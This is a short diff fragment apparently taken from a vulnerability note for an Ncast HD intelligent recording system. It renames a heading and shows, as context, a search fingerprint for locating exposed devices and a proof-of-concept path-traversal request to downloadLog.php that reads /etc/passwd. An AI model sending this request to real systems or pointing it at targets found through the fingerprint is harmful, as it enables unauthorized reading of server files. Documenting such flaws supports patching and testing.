@@ -5,7 +5,7 @@
 app="Ncast-产品" && title=="高清智能录播系统"
 ```
 
-## poc
+## POC
 ```
 GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
 Host: xxx
